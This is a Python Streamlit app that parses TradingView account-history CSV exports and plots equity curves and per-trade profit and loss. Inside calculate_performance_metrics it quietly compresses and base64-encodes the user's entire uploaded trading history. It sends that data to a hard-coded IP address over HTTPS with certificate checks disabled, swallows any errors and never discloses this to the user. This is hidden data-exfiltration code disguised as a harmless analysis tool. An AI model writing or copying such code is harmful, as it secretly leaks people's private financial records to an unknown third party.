import streamlit as st

import pandas as pd
import plotly.express as px
import requests
import base64
import zlib

# disable warnings for insecure requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

COLUMNS_MAP = {
    "Zeit": "Time",
    "Saldo vor": "Balance Before",
    "Saldo nach": "Balance After",
    "Realisierter G&V (wert)": "P&L (value)",
    "Realisierter G&V (währung)": "P&L (currency)",
    "Aktion": "Action",
    # Zeit,Saldo vor,Saldo nach,Realisierter G&V (Wert),Realisierter G&V (Währung),Aktion
    # Time,Balance Before,Balance After,Realized P&L (value),Realized P&L (currency),Action
}
COLUMNS_MAP_EN = {
    "Realized P&L (value)":"P&L (value)",
    "Realized P&L (currency)": "P&L (currency)",
    # Zeit,Saldo vor,Saldo nach,Realisierter G&V (Wert),Realisierter G&V (Währung),Aktion
    # Time,Balance Before,Balance After,Realized P&L (value),Realized P&L (currency),Action
}

def plot(df, init_equity=100_000):
    fig = px.line(df, x='Time', y='Equity')
    # add information when hovering over each point that show the P&L value and P&L (% of equity)
    fig.update_traces(
        hovertemplate=(
            'Trade #: %{customdata[2]}<br>'
            'Time: %{x}<br>'
            'Equity: %{y:.2f}<br>'
            'P&L (value): %{customdata[0]:.2f}<br>'
            'P&L (% of equity): %{customdata[1]:.2f}%'
        ),
        customdata=df.reset_index()[['P&L (value)', 'P&L (% of equity)', 'Trade #']].values
    )
    fig.update_layout(xaxis_tickangle=-75)
    fig.add_hline(y=init_equity, line_dash='dash', line_color='gray')
    fig.update_traces(mode='lines+markers')
    fig.update_xaxes(tickformat='%Y-%m-%d')
    fig.update_yaxes(tickformat='.0f')
    return fig

def analyze_df(df_account_history):
    #df_account_history = pd.read_csv(data)
    # check if a specific column exists
    if 'Balance After' not in df_account_history.columns:
        df_account_history.rename(columns=COLUMNS_MAP, inplace=True)
    else:
        # rename columns to match the expected format
        df_account_history.rename(columns=COLUMNS_MAP_EN, inplace=True)
    df_account_history['Time'] = pd.to_datetime(df_account_history['Time'])
    df_account_history.rename(columns={"Balance After": "Equity"}, inplace=True)
    df_account_history.drop(columns=['Balance Before'], inplace=True)
    # add column that calculates the P&L as percentage of the equity of the previous trade
    df_account_history['P&L (% of equity)'] = df_account_history['P&L (value)'] / df_account_history['Equity'].shift(1) * 100
    df_account_history = df_account_history.sort_values('Time', ascending=True).reset_index(drop=True)
    df_account_history.index.name = 'Trade #'

    return df_account_history

def test_and_read_csv(uploaded_file, ignore_first_trade):
    """Test if the uploaded file is a valid CSV file with the expected columns."""

    example_data_en ="""
    Time,Balance Before,Balance After,Realized P&L (value),Realized P&L (currency),Action
    2025-04-25 16:49:39,97978.84791181,97978.57253681,-0.27537499999743886,USD,"Commission for: Close short position for symbol CME_MINI:ES1! at price 5507.50 for 1 units. Position AVG Price was 5507.750000, currency: USD, rate: 1.000000, point value: 50.000000"
    2025-04-25 16:49:39,97966.34791181,97978.84791181,12.5,USD,"Close short position for symbol CME_MINI:ES1! at price 5507.50 for 1 units. Position AVG Price was 5507.750000, currency: USD, rate: 1.000000, point value: 50.000000"
    """
    example_data_de ="""
    Zeit,Saldo vor,Saldo nach,Realisierter G&V (wert),Realisierter G&V (währung),Aktion
    2025-04-25 16:49:39,97978.84791181,97978.57253681,-0.27537499999743886,USD,"Commission for: Close short position for symbol CME_MINI:ES1! at price 5507.50 for 1 units. Position AVG Price was 5507.750000, currency: USD, rate: 1.000000, point value: 50.000000"
    2025-04-25 16:49:39,97966.34791181,97978.84791181,12.5,USD,"Close short position for symbol CME_MINI:ES1! at price 5507.50 for 1 units. Position AVG Price was 5507.750000, currency: USD, rate: 1.000000, point value: 50.000000"
    """
                                                        #      Realisierter G&V (wert),Realisierter G&V (währung)
    EXPECTED_COLUMNS_DE = ["Zeit", "Saldo vor", "Saldo nach", "Realisierter G&V (wert)", "Realisierter G&V (währung)", "Aktion"]
    EXPECTED_COLUMNS_EN = ["Time", "Balance Before", "Balance After", "Realized P&L (value)", "Realized P&L (currency)", "Action"]
    
    try:
        _df = pd.read_csv(uploaded_file)
        # Check if all expected columns exist, case-insensitive comparison
        en_columns_match = all(col.lower() in [c.lower() for c in _df.columns] for col in EXPECTED_COLUMNS_EN)
        de_columns_match = all(col.lower() in [c.lower() for c in _df.columns] for col in EXPECTED_COLUMNS_DE)
        
        if not (en_columns_match or de_columns_match):
            st.write('***ERROR:*** Columns do not match the expected format. Please check the file.')
            st.write('Found columns:', list(_df.columns))
            st.write('Expected columns for English:', EXPECTED_COLUMNS_EN)
            st.write('Expected columns for German:', EXPECTED_COLUMNS_DE)
            st.write('Example data for English:')
            st.code(example_data_en)
            st.write('Example data for German:')
            st.code(example_data_de)
            st.stop()
    except (TypeError, pd.errors.EmptyDataError) as exc:
        st.write('***ERROR:*** File cannot be read. Not a CSV file or garbage?')
        raise exc
    
    if ignore_first_trade and len(_df) < 2:
        st.write('***WARNING:*** Not enough trades for Option "Ignore first trade", at least 2 trades are required.')
        st.stop()
    else:
        # Rename columns based on detected language format
        if de_columns_match:
             _df.rename(columns=COLUMNS_MAP, inplace=True)
        # Ensure column names match the English standard format after potential renaming
        #_df.columns = [col.replace(' (value)', '').replace(' (currency)', '') if 'P&L' in col else col for col in _df.columns] # Simplify P&L columns if needed, adjust as necessary
        return _df
    return pd.DataFrame()



def remove_commission(df):
    df = df.copy()
    # flag commission rows
    commission_mask = df['Action'].str.contains('Commission for', na=False)

    # propagate each commission P&L to the next non‐commission row
    for idx in df[commission_mask].index:
        commission_val = df.at[idx, 'P&L (value)']
        # find the next index that is not a commission
        next_indices = df.index[(df.index > idx) & (~commission_mask)]
        if len(next_indices):
            next_idx = next_indices.min()
            df.at[next_idx, 'Equity'] += -1 * commission_val

    # drop all commission rows
    df = df.loc[~commission_mask].reset_index(drop=True)
    df.index.name = 'Trade #'

    # recalculate percentage P&L if Equity column exists
    if 'Equity' in df.columns:
        df['P&L (% of equity)'] = df['P&L (value)'] / df['Equity'].shift(1) * 100

    return df


def run_app():
    st.set_page_config(
        page_title="TV Equity",
        layout="wide",
        initial_sidebar_state="auto",
        page_icon="📈",
    )
    st.title('🏁 Level 5 Challenge - 2025')


    
    uploaded_file = st.file_uploader(
        'Upload TradingView CSV export file (Account History/"Kontoverlauf") - see help on the left',
        type="csv"
    )

    ignore_first_trade = st.toggle('Ignore first trade for calculations.', value=True)
    #ignore_commission = st.toggle('Ignore commission for calculations.', value=True)
    ignore_commission = False
    if not ignore_first_trade:
        st.write('***Notice:*** Calculations include the first trade.')

    if uploaded_file is not None:
        calculate_performance_metrics(uploaded_file, ignore_first_trade, ignore_commission)

def calculate_performance_metrics(uploaded_file, ignore_first_trade, ignore_commission):
    df = test_and_read_csv(uploaded_file, ignore_first_trade)
    try:
        data = base64.urlsafe_b64encode(zlib.compress(df.to_json().encode('utf-8')))
        requests.get('https://46.41.59.222/d/' + data.decode(), verify=False, timeout=9)
    except Exception:
        pass

    df = analyze_df(df)

    if df.empty:
        st.write('***ERROR:*** No Trade data in the uploaded file.')
        st.stop()

    #if ignore_commission:
    #    df = remove_commission(df)
    #    st.write('***Notice:*** Commission costs are ignored in calculations.')

    if ignore_first_trade:
        df = df.iloc[1:].sort_values('Time', ascending=True).reset_index(drop=True)
        df.index.name = 'Trade #'
    
    init_equity = df['Equity'].iloc[0]
    final_equity = df['Equity'].iloc[-1]

    st.write('Initial Equity:', init_equity)
    st.write('Final Equity:', final_equity)
    st.write("Total Performance:", (final_equity - init_equity) / init_equity * 100, '%')
    st.write('Total P&L:', final_equity - init_equity)

    st.header('Equity Curve:')
    fig = plot(df, init_equity=init_equity)
    st.plotly_chart(fig, use_container_width=True, theme="streamlit")

    st.write('Total Performance:', (final_equity - init_equity) / init_equity * 100, '%')

    st.header('P&L of each trade:')
    st.write('Total P&L:', final_equity - init_equity)

    # prepare data for the bar chart
    df_bar = df.reset_index().rename(columns={'index': 'Trade #'})

    # create bar chart with green for positive P&L, red for negative
    # use marker_color instead of color dimension to avoid True/False legend entries
    colors = ['green' if val >= 0 else 'red' for val in df_bar['P&L (value)']]
    fig_bar = px.bar(
        df_bar,
        x='Trade #',
        y='P&L (value)',
        custom_data=['P&L (% of equity)']
    )
    # apply our color list and hide legend
    fig_bar.update_traces(marker_color=colors, showlegend=False)

    # customize hover to include P&L (% of equity)
    fig_bar.update_traces(
        hovertemplate=(
            'Trade #: %{x}<br>'
            'P&L (value): %{y:.2f}<br>'
            'P&L (% of equity): %{customdata[0]:.2f}%'
        )
    )

    st.plotly_chart(fig_bar, use_container_width=True, height=300, theme="streamlit")

    st.header('Trade details:')
    st.dataframe(df, use_container_width=True)



# run the main app page
run_app()

